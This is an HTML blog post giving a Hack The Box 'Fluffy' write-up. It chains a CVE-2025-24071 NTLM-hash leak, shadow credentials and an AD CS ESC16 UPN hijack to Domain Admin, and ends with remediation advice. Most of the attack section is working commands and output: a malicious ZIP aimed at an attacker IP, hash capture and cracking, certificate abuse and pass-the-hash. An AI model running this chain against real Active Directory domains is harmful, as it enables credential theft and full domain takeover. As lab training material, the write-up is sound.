@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
+  <title>┌──(1kb2㉿onekbtwo)-[~/blog/fluffy]</title>
+  <link rel="stylesheet" href="../style.css">
+  <link rel="alternate" type="application/rss+xml" title="1kb2" href="../feed.xml">
+  <link rel="icon" href="../favicon.svg" type="image/svg+xml">
+  <link rel="icon" href="../favicon-32.png" sizes="32x32" type="image/png">
+  <link rel="apple-touch-icon" href="../apple-touch-icon.png">
+  <meta name="theme-color" content="#000000">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="HTB CPTS Track: Fluffy (easy)">
+  <meta property="og:description" content="Assumed-breach HTB box: NTLM coercion, shadow credentials, and AD CS ESC16 chained to Domain Admin.">
+  <meta property="og:url" content="https://1kb2.xyz/blog/fluffy.html">
+  <meta property="og:image" content="https://1kb2.xyz/images/brand/graf-og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="HTB CPTS Track: Fluffy (easy)">
+  <meta name="twitter:description" content="Assumed-breach HTB box: NTLM coercion, shadow credentials, and AD CS ESC16 chained to Domain Admin.">
+  <meta name="twitter:image" content="https://1kb2.xyz/images/brand/graf-og.png">
+  <script>document.documentElement.className = "js";</script>
+  <script src="../js/graf.js" defer></script>
+  <script src="../js/post.js" defer></script>
+</head>
+<body data-graf="perch">
+  <nav class="nav">
+    <a href="../index.html">home</a>
+    <a href="../timeline.html">timeline</a>
+    <a href="../blog/index.html">blog</a>
+    <a href="../feed.xml">rss</a>
+  </nav>
+
+  <main class="markdown-body">
+    <h1>HTB CPTS Track: Fluffy (easy)</h1>
+    <p class="post-meta">2026-09-23 &middot; <a class="post-cat" href="index.html#cat-writeups">writeups</a></p>
+    <p class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/active-directory.html" data-tag="active-directory">#active-directory</a><a class="tag" href="tag/adcs.html" data-tag="adcs">#adcs</a><a class="tag" href="tag/esc16.html" data-tag="esc16">#esc16</a><a class="tag" href="tag/shadow-credentials.html" data-tag="shadow-credentials">#shadow-credentials</a><a class="tag" href="tag/pkinit.html" data-tag="pkinit">#pkinit</a><a class="tag" href="tag/upn-hijack.html" data-tag="upn-hijack">#upn-hijack</a><a class="tag" href="tag/forced-auth.html" data-tag="forced-auth">#forced-auth</a><a class="tag" href="tag/generic-write.html" data-tag="generic-write">#generic-write</a></p>
+    <p class="post-abstract">Assumed-breach HTB box: NTLM coercion, shadow credentials, and AD CS ESC16 chained to Domain Admin.</p>
+    <details class="toc-box" open>
+      <summary>contents</summary>
+<div class="toc">
+<ul>
+<li><a href="#enumeration">Enumeration</a><ul>
+<li><a href="#nmap">Nmap</a></li>
+<li><a href="#smb">SMB</a></li>
+</ul>
+</li>
+<li><a href="#initial-foothold-cve-2025-24071">Initial Foothold: CVE-2025-24071</a></li>
+<li><a href="#domain-recon-bloodhound">Domain Recon: BloodHound</a></li>
+<li><a href="#user-shadow-credentials-on-winrm_svc">User: Shadow Credentials on winrm_svc</a></li>
+<li><a href="#root-chaining-genericwrite-ad-cs-esc16">Root: Chaining GenericWrite + AD CS ESC16</a><ul>
+<li><a href="#the-esc16-exploitation">The ESC16 exploitation</a></li>
+</ul>
+</li>
+<li><a href="#gotchas-worth-remembering">Gotchas Worth Remembering</a></li>
+<li><a href="#remediation">Remediation</a></li>
+</ul>
+</div>
+    </details>
+<p><img alt="" src="../images/fluffy1.png" /></p>
+<p>Fluffy is an assumed-breach Active Directory box: you start with a low-privileged domain account and work up to Domain Admin. The path chains four AD techniques that show up constantly in real engagements:</p>
+<ol>
+<li><strong><code>CVE-2025-24071</code></strong>, a <code>.library-ms</code> file dropped in a writable share coerces a user into leaking their NetNTLMv2 hash.</li>
+<li><strong>Shadow Credentials</strong> (<code>msDS-KeyCredentialLink</code>), abuse write access over an account to authenticate <em>as</em> it via certificates, no password needed.</li>
+<li><strong>AD CS ESC16</strong>, the CA globally disables the SID security extension, so certificates get mapped to accounts by the (mutable) UPN instead of the (immutable) SID.</li>
+<li>A <strong>UPN-hijack</strong> tying it together to mint a certificate that authenticates as <code>Administrator</code>.</li>
+</ol>
+<blockquote>
+<p>Assumed-breach start, credentials provided:</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code>j.fleischman / J0elTHEM4n1990!
+</code></pre></div>
+
+<hr />
+<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="link to this section">&para;</a></h2>
+<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="link to this section">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.129.65.0<span class="w"> </span>-T5
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-22 04:14:23Z)
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0   # WinRM
+9389/tcp  open  mc-nmf        .NET Message Framing
+Service Info: Host: DC01; OS: Windows
+</code></pre></div>
+
+<p>The classic domain-controller fingerprint: DNS (53), Kerberos (88), LDAP (389/636/3268), SMB (445), WinRM (5985). The host is <code>DC01</code> in the <code>fluffy.htb</code> domain. Note the <code>+7h00m00s</code> clock skew nmap reports, Kerberos is time-sensitive, so I sync to the DC before any Kerberos auth later (<code>sudo ntpdate DC01.fluffy.htb</code>).</p>
+<p>Add the host to <code>/etc/hosts</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s1">'10.129.65.0 fluffy.htb DC01 DC01.fluffy.htb'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
+</code></pre></div>
+
+<h3 id="smb">SMB<a class="headerlink" href="#smb" title="link to this section">&para;</a></h3>
+<p>With the provided creds, enumerate shares:</p>
+<div class="codehilite"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.65.0<span class="w"> </span>-u<span class="w"> </span>j.fleischman<span class="w"> </span>-p<span class="w"> </span><span class="s1">'J0elTHEM4n1990!'</span><span class="w"> </span>--shares
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>Share           Permissions     Remark
+-----           -----------     ------
+ADMIN$                          Remote Admin
+C$                              Default share
+IPC$            READ            Remote IPC
+IT              READ,WRITE
+NETLOGON        READ            Logon server share
+SYSVOL          READ            Logon server share
+</code></pre></div>
+
+<p><code>READ,WRITE</code> on a non-default <code>IT</code> share is the lead, a writable share is a place to <em>plant</em> something. Contents:</p>
+<div class="codehilite"><pre><span></span><code>smbclient<span class="w"> </span>-U<span class="w"> </span>j.fleischman<span class="w"> </span><span class="se">\\\\</span><span class="m">10</span>.129.65.0<span class="se">\\</span>IT
+smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>dir
+<span class="w">  </span>Everything-1.4.1.1026.x64<span class="w">           </span>D
+<span class="w">  </span>Everything-1.4.1.1026.x64.zip<span class="w">       </span>A<span class="w">  </span><span class="m">1827464</span>
+<span class="w">  </span>KeePass-2.58<span class="w">                        </span>D
+<span class="w">  </span>KeePass-2.58.zip<span class="w">                    </span>A<span class="w">  </span><span class="m">3225346</span>
+<span class="w">  </span>Upgrade_Notice.pdf<span class="w">                  </span>A<span class="w">   </span><span class="m">169963</span>
+</code></pre></div>
+
+<p><code>Upgrade_Notice.pdf</code> is a patch announcement:</p>
+<p><img alt="" src="../images/fluffy2.png" /></p>
+<p>It lists recently disclosed CVEs the environment is (supposedly) behind on. I broke the list down using a clanker, to find one that fits what I have, a writable share plus users who browse it:</p>
+<p><img alt="" src="../images/fluffy3.png" /></p>
+<p><code>CVE-2025-24071 , Windows File Explorer spoofing / NTLM hash leak</code> stands out. Public PoC: <a href="https://www.exploit-db.com/exploits/52310">exploit-db 52310</a>.</p>
+<blockquote>
+<p><strong>Why this works:</strong> Windows Explorer auto-initiates an SMB authentication request when a <code>.library-ms</code> file is <em>extracted from a ZIP</em>. Point that request at an attacker-controlled SMB server and the victim's machine hands over their NetNTLMv2 hash, no click beyond extraction. Drop the malicious ZIP in a share a user will open, and you harvest their hash.</p>
+</blockquote>
+<hr />
+<h2 id="initial-foothold-cve-2025-24071">Initial Foothold: CVE-2025-24071<a class="headerlink" href="#initial-foothold-cve-2025-24071" title="link to this section">&para;</a></h2>
+<p>Generate the malicious <code>.library-ms</code> ZIP, pointing it at my VPN IP:</p>
+<div class="codehilite"><pre><span></span><code>python3<span class="w"> </span><span class="m">52310</span>.py<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.10.15.141<span class="w"> </span>-o<span class="w"> </span>cool.library-ms
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Created<span class="w"> </span>ZIP:<span class="w"> </span>cool.library-ms/malicious.zip
+</code></pre></div>
+
+<p>Start Responder to catch the incoming authentication:</p>
+<div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>tun0
+</code></pre></div>
+
+<p>Upload the ZIP to the writable <code>IT</code> share and wait for a user to browse it:</p>
+<div class="codehilite"><pre><span></span><code>smbclient<span class="w"> </span>-U<span class="w"> </span>j.fleischman<span class="w"> </span><span class="se">\\\\</span><span class="m">10</span>.129.65.0<span class="se">\\</span>IT
+smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>put<span class="w"> </span>malicious.zip
+</code></pre></div>
+
+<p>A user (<code>p.agila</code>) triggers it, and Responder captures the NetNTLMv2 hash:</p>
+<div class="codehilite"><pre><span></span><code>[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
+[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:92d0f5e748afe59b:D02D1C31DD662E69C28A63D90C1AB364:0101...
+</code></pre></div>
+
+<p>Crack it offline with hashcat mode <code>5600</code> (NetNTLMv2):</p>
+<div class="codehilite"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">5600</span><span class="w"> </span><span class="s1">'hash(p.agila)'</span><span class="w"> </span>/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>P.AGILA::FLUFFY:...:prometheusx-303
+</code></pre></div>
+
+<p>New creds: <code>p.agila / prometheusx-303</code>.</p>
+<hr />
+<h2 id="domain-recon-bloodhound">Domain Recon: BloodHound<a class="headerlink" href="#domain-recon-bloodhound" title="link to this section">&para;</a></h2>
+<p>Collect with the CE Python ingestor using the new account:</p>
+<div class="codehilite"><pre><span></span><code>pip<span class="w"> </span>install<span class="w"> </span>bloodhound-ce
+bloodhound-ce-python<span class="w"> </span>-c<span class="w"> </span>all<span class="w"> </span>-d<span class="w"> </span>fluffy.htb<span class="w"> </span>-u<span class="w"> </span>p.agila<span class="w"> </span>-p<span class="w"> </span>prometheusx-303<span class="w"> </span>-ns<span class="w"> </span><span class="m">10</span>.129.65.0<span class="w"> </span>-dc<span class="w"> </span>DC01.fluffy.htb<span class="w"> </span>--zip
+</code></pre></div>
+
+<p>Reviewing outbound rights, <code>p.agila</code> can write to the <strong><code>SERVICE ACCOUNTS</code></strong> group, and membership in it is the interesting pivot, it chains toward accounts in <code>Remote Management Users</code>:</p>
+<p><img alt="" src="../images/fluffy4.png" /></p>
+<p>Add <code>p.agila</code> to <code>SERVICE ACCOUNTS</code>:</p>
+<div class="codehilite"><pre><span></span><code>net<span class="w"> </span>rpc<span class="w"> </span>group<span class="w"> </span>addmem<span class="w"> </span><span class="s2">"SERVICE ACCOUNTS"</span><span class="w"> </span><span class="s2">"p.agila"</span><span class="w"> </span>-U<span class="w"> </span><span class="s2">"FLUFFY.HTB"</span>/<span class="s2">"p.agila"</span>%<span class="s2">"prometheusx-303"</span><span class="w"> </span>-S<span class="w"> </span><span class="s2">"DC01.fluffy.htb"</span>
+</code></pre></div>
+
+<hr />
+<h2 id="user-shadow-credentials-on-winrm_svc">User: Shadow Credentials on <code>winrm_svc</code><a class="headerlink" href="#user-shadow-credentials-on-winrm_svc" title="link to this section">&para;</a></h2>
+<p><code>SERVICE ACCOUNTS</code> grants write access over the service accounts, including <code>winrm_svc</code> (a member of <code>Remote Management Users</code>, so owning it = a WinRM shell). Rather than reset its password (noisy, and breaks the account), I use <strong>Shadow Credentials</strong>.</p>
+<blockquote>
+<p><strong>Why Shadow Credentials works:</strong> with write access over an account's <code>msDS-KeyCredentialLink</code> attribute, you add your <em>own</em> certificate as an alternate credential. That attribute is trusted for PKINIT (certificate-based Kerberos pre-auth, the Windows Hello for Business mechanism), so you can then request a TGT <em>as that account</em> with your private key, no password, no reset.</p>
+</blockquote>
+<p>Plant the shadow credential with pywhisker:</p>
+<div class="codehilite"><pre><span></span><code>python3<span class="w"> </span>pywhisker.py<span class="w"> </span>-d<span class="w"> </span>fluffy.htb<span class="w"> </span>-u<span class="w"> </span>p.agila<span class="w"> </span>-p<span class="w"> </span>prometheusx-303<span class="w"> </span>--target<span class="w"> </span>winrm_svc<span class="w"> </span>--action<span class="w"> </span>add
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Target<span class="w"> </span>user<span class="w"> </span>found:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>winrm<span class="w"> </span>service,CN<span class="o">=</span>Users,DC<span class="o">=</span>fluffy,DC<span class="o">=</span>htb
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Updated<span class="w"> </span>the<span class="w"> </span>msDS-KeyCredentialLink<span class="w"> </span>attribute<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>target<span class="w"> </span>object
+<span class="o">[</span>i<span class="o">]</span><span class="w"> </span>Passwort<span class="w"> </span>für<span class="w"> </span>PFX:<span class="w"> </span>L7BnX1pyVibPNOvPV3zN
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>PFX<span class="w"> </span><span class="o">(</span><span class="c1">#PKCS12) certificate &amp; key at path: ZI3EQ3U7.pfx</span>
+</code></pre></div>
+
+<p>Exchange the certificate for a TGT via PKINIT:</p>
+<div class="codehilite"><pre><span></span><code>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/dirkjanm/PKINITtools
+python<span class="w"> </span>gettgtpkinit.py<span class="w"> </span>-cert-pfx<span class="w"> </span>ZI3EQ3U7.pfx<span class="w"> </span>-pfx-pass<span class="w"> </span><span class="s1">'L7BnX1pyVibPNOvPV3zN'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.65.0<span class="w"> </span>fluffy.htb/winrm_svc<span class="w"> </span>winrm_svc.ccache
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>TGT<span class="w"> </span>to<span class="w"> </span>file
+</code></pre></div>
+
+<p>Evil-WinRM authenticates with Kerberos, which needs a <code>krb5.conf</code> pointing at the realm's KDC, without it you get <code>Cannot find KDC for realm 'FLUFFY.HTB'</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># /etc/krb5.conf</span>
+<span class="k">[libdefaults]</span>
+<span class="w">    </span><span class="na">default_realm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">FLUFFY.HTB</span>
+<span class="w">    </span><span class="na">dns_lookup_kdc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">false</span>
+<span class="w">    </span><span class="na">dns_lookup_realm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">false</span>
+
+<span class="k">[realms]</span>
+<span class="w">    </span><span class="na">FLUFFY.HTB</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">{</span>
+<span class="w">        </span><span class="na">kdc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">dc01.fluffy.htb</span>
+<span class="w">        </span><span class="na">admin_server</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">dc01.fluffy.htb</span>
+<span class="w">    </span><span class="na">}</span>
+
+<span class="k">[domain_realm]</span>
+<span class="w">    </span><span class="na">.fluffy.htb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">FLUFFY.HTB</span>
+<span class="w">    </span><span class="na">fluffy.htb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">FLUFFY.HTB</span>
+</code></pre></div>
+
+<p>Point Kerberos at the ticket and connect (FQDN required for Kerberos SPN matching):</p>
+<div class="codehilite"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>~/Fluffy/winrm_svc.ccache
+evil-winrm<span class="w"> </span>-i<span class="w"> </span>dc01.fluffy.htb<span class="w"> </span>-r<span class="w"> </span>FLUFFY.HTB
+*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\w</span>inrm_svc<span class="se">\D</span>esktop&gt;<span class="w"> </span><span class="nb">type</span><span class="w"> </span>user.txt
+</code></pre></div>
+
+<p><strong>user.txt captured.</strong></p>
+<hr />
+<h2 id="root-chaining-genericwrite-ad-cs-esc16">Root: Chaining GenericWrite + AD CS ESC16<a class="headerlink" href="#root-chaining-genericwrite-ad-cs-esc16" title="link to this section">&para;</a></h2>
+<p>Back in BloodHound, <code>winrm_svc</code> has two properties that combine into a full escalation:</p>
+<ol>
+<li><code>WINRM_SVC</code> has <strong><code>GenericWrite</code></strong> over <code>CA_SVC</code>:</li>
+</ol>
+<p><img alt="" src="../images/fluffy5.png" /></p>
+<ol start="2">
+<li><code>CA_SVC</code> is a member of <strong><code>Cert Publishers</code></strong>:</li>
+</ol>
+<p><img alt="" src="../images/fluffy6.png" /></p>
+<p>These are the two halves of ESC16. First, take over <code>ca_svc</code> the same way, shadow credentials via the <code>GenericWrite</code>:</p>
+<div class="codehilite"><pre><span></span><code>python<span class="w"> </span>pywhisker.py<span class="w"> </span>--dc-ip<span class="w"> </span><span class="m">10</span>.129.65.0<span class="w"> </span>-d<span class="w"> </span>fluffy.htb<span class="w"> </span>-u<span class="w"> </span>winrm_svc<span class="w"> </span>-k<span class="w"> </span>--no-pass<span class="w"> </span>--target<span class="w"> </span>ca_svc<span class="w"> </span>--action<span class="w"> </span>add
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Target<span class="w"> </span>user<span class="w"> </span>found:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>certificate<span class="w"> </span>authority<span class="w"> </span>service,CN<span class="o">=</span>Users,DC<span class="o">=</span>fluffy,DC<span class="o">=</span>htb
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Updated<span class="w"> </span>the<span class="w"> </span>msDS-KeyCredentialLink<span class="w"> </span>attribute<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>target<span class="w"> </span>object
+<span class="o">[</span>i<span class="o">]</span><span class="w"> </span>Passwort<span class="w"> </span>für<span class="w"> </span>PFX:<span class="w"> </span>FYmUgVmkpJRCvQqRPUkS
+
+python<span class="w"> </span>gettgtpkinit.py<span class="w"> </span>-cert-pfx<span class="w"> </span>nIDb5fO3.pfx<span class="w"> </span>-pfx-pass<span class="w"> </span><span class="s1">'FYmUgVmkpJRCvQqRPUkS'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.65.0<span class="w"> </span>fluffy.htb/ca_svc<span class="w"> </span>ca_svc.ccache
+</code></pre></div>
+
+<p>Enumerate AD CS as <code>ca_svc</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>~/Fluffy/ca_svc.ccache
+certipy<span class="w"> </span>find<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.65.0<span class="w"> </span>-target<span class="w"> </span>dc01.fluffy.htb<span class="w"> </span>-vulnerable<span class="w"> </span>-stdout
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>    CA Name                : fluffy-DC01-CA
+    Disabled Extensions    : 1.3.6.1.4.1.311.25.2
+    ...
+    Enroll                 : FLUFFY.HTB\Cert Publishers
+    [!] Vulnerabilities
+      ESC16                : Security Extension is disabled.
+</code></pre></div>
+
+<p>Two things line up in that output:
+- <code>Disabled Extensions : 1.3.6.1.4.1.311.25.2</code>, the CA has globally disabled <code>szOID_NTDS_CA_SECURITY_EXT</code>. That extension embeds the requester's <strong>SID</strong> into the certificate for <em>strong</em> mapping. With it gone, the DC falls back to <strong>weak mapping by UPN</strong>, and a UPN is just a mutable string attribute.
+- <code>Enroll : FLUFFY.HTB\Cert Publishers</code>, only Cert Publishers (and admins) can request certificates. <code>ca_svc</code> is in that group; <code>winrm_svc</code> is not. So <strong><code>ca_svc</code> must be the enrollee.</strong></p>
+<h3 id="the-esc16-exploitation">The ESC16 exploitation<a class="headerlink" href="#the-esc16-exploitation" title="link to this section">&para;</a></h3>
+<p>The plan writes itself from those two facts:
+- <strong>Enrollee</strong> = <code>ca_svc</code> (it has enrollment rights via Cert Publishers).
+- <strong>Writer</strong> = <code>winrm_svc</code> (it has <code>GenericWrite</code> over <code>ca_svc</code>, which includes the <code>userPrincipalName</code> attribute).</p>
+<p>So I use <code>winrm_svc</code> to set <code>ca_svc</code>'s UPN to <code>administrator</code>, enroll a certificate as <code>ca_svc</code> (which now <em>claims</em> to be administrator), and, because the SID extension is disabled, the DC maps the certificate to the real Administrator.</p>
+<p><strong>1. Hijack <code>ca_svc</code>'s UPN</strong> (authenticating as the writer, <code>winrm_svc</code>):</p>
+<div class="codehilite"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>~/Fluffy/winrm_svc.ccache
+certipy<span class="w"> </span>account<span class="w"> </span>-u<span class="w"> </span>winrm_svc@fluffy.htb<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.65.0<span class="w"> </span>-target<span class="w"> </span>DC01.fluffy.htb<span class="w"> </span>-user<span class="w"> </span>ca_svc<span class="w"> </span>-upn<span class="w"> </span>administrator<span class="w"> </span>update
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>updated<span class="w"> </span><span class="s1">'ca_svc'</span>
+</code></pre></div>
+
+<p><strong>2. Request a client-auth certificate as <code>ca_svc</code></strong> (its UPN now reads <code>administrator</code>):</p>
+<div class="codehilite"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>~/Fluffy/ca_svc.ccache
+certipy<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span>ca_svc@fluffy.htb<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.65.0<span class="w"> </span>-dc-host<span class="w"> </span>DC01.fluffy.htb<span class="w"> </span>-ca<span class="w"> </span><span class="s1">'fluffy-DC01-CA'</span><span class="w"> </span>-template<span class="w"> </span>User
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>certificate<span class="w"> </span>with<span class="w"> </span>UPN<span class="w"> </span><span class="s1">'administrator'</span>
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Certificate<span class="w"> </span>has<span class="w"> </span>no<span class="w"> </span>object<span class="w"> </span>SID
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saving<span class="w"> </span>certificate<span class="w"> </span>and<span class="w"> </span>private<span class="w"> </span>key<span class="w"> </span>to<span class="w"> </span><span class="s1">'administrator.pfx'</span>
+</code></pre></div>
+
+<p><code>Certificate has no object SID</code> is expected, that is ESC16 in action.</p>
+<p><strong>3. Restore <code>ca_svc</code>'s UPN</strong>, this step is not optional. If <code>ca_svc</code> still owns the UPN <code>administrator</code>, the DC resolves the certificate back to <code>ca_svc</code>. Setting it back means <em>no</em> account owns that UPN, so the DC falls through to the <code>sAMAccountName</code> match, the real built-in <code>Administrator</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>~/Fluffy/winrm_svc.ccache
+certipy<span class="w"> </span>account<span class="w"> </span>-u<span class="w"> </span>winrm_svc@fluffy.htb<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.65.0<span class="w"> </span>-target<span class="w"> </span>DC01.fluffy.htb<span class="w"> </span>-user<span class="w"> </span>ca_svc<span class="w"> </span>-upn<span class="w"> </span>ca_svc@fluffy.htb<span class="w"> </span>update
+</code></pre></div>
+
+<p><strong>4. Authenticate with the certificate.</strong> The cert's UPN is the bare string <code>administrator</code> (no <code>@domain</code>), which trips Certipy's identity detection, pass <code>-username</code> and <code>-domain</code> explicitly:</p>
+<div class="codehilite"><pre><span></span><code>certipy<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>administrator.pfx<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.65.0<span class="w"> </span>-username<span class="w"> </span>administrator<span class="w"> </span>-domain<span class="w"> </span>fluffy.htb
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">'administrator@fluffy.htb'</span>:<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
+</code></pre></div>
+
+<p>Domain Admin's NT hash. Pass-the-hash into a shell on the DC:</p>
+<div class="codehilite"><pre><span></span><code>evil-winrm<span class="w"> </span>-i<span class="w"> </span>dc01.fluffy.htb<span class="w"> </span>-u<span class="w"> </span>administrator<span class="w"> </span>-H<span class="w"> </span>8da83a3fa618b6e3a00e93f676c92a6e
+*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;<span class="w"> </span><span class="nb">type</span><span class="w"> </span>root.txt
+</code></pre></div>
+
+<p><strong>root.txt captured. Box owned.</strong></p>
+<hr />
+<h2 id="gotchas-worth-remembering">Gotchas Worth Remembering<a class="headerlink" href="#gotchas-worth-remembering" title="link to this section">&para;</a></h2>
+<ul>
+<li><strong>Kerberos tickets are short-lived.</strong> The <code>.ccache</code> TGTs from PKINIT last ~10 hours; come back the next day and every Kerberos command fails with <code>KDC_ERR</code> / <code>invalidCredentials</code>. The <code>.pfx</code> files are the durable key (certs live ~1 year), just re-run <code>gettgtpkinit</code> to mint fresh tickets. Sync your clock to the DC (<code>ntpdate</code>) if you hit skew errors.</li>
+<li><strong>In ESC16, the enrollee needs enrollment rights.</strong> I first tried hijacking <code>winrm_svc</code>'s UPN and enrolling as it, <code>CERTSRV_E_ENROLL_DENIED</code>. Only <code>ca_svc</code> (Cert Publishers) can enroll, so it had to be the enrollee. The account whose UPN you hijack must be the one that can actually request the certificate.</li>
+<li><strong>Restore the UPN before you authenticate</strong>, or the certificate maps back to your controlled account instead of the target.</li>
+<li><strong>Bare vs full UPN.</strong> The cert UPN <code>administrator</code> (no <code>@domain</code>) needs <code>-username administrator -domain fluffy.htb</code> on <code>certipy auth</code>; with only <code>-domain</code> you get a name mismatch, with neither you get "identity not found."</li>
+</ul>
+<h2 id="remediation">Remediation<a class="headerlink" href="#remediation" title="link to this section">&para;</a></h2>
+<ul>
+<li><strong>Re-enable the security extension</strong> on the CA (<code>szOID_NTDS_CA_SECURITY_EXT</code> must not be in the CA's <code>DisableExtensionList</code>), and set <code>StrongCertificateBindingEnforcement = 2</code> (Full Enforcement) on the DCs so certificates are mapped by SID, not UPN.</li>
+<li><strong>Tighten share ACLs</strong>, no <code>WRITE</code> on <code>IT</code> for standard users, which killed the initial NTLM-leak vector.</li>
+<li><strong>Audit <code>msDS-KeyCredentialLink</code> write access</strong>, <code>GenericWrite</code>/<code>GenericAll</code> over accounts enables Shadow Credentials; scope delegated permissions tightly and monitor changes to that attribute.</li>
+<li><strong>Patch</strong> <code>CVE-2025-24071</code>.</li>
+</ul>
+<hr />
+<p>Reference used for the AD CS chain: <a href="https://xbz0n.sh/blog/adcs-complete-attack-reference">https://xbz0n.sh/blog/adcs-complete-attack-reference</a></p>
+  </main>
+
+  <footer class="footer">
+    <a href="../index.html">back to top</a>
+  </footer>
+</body>
+</html>
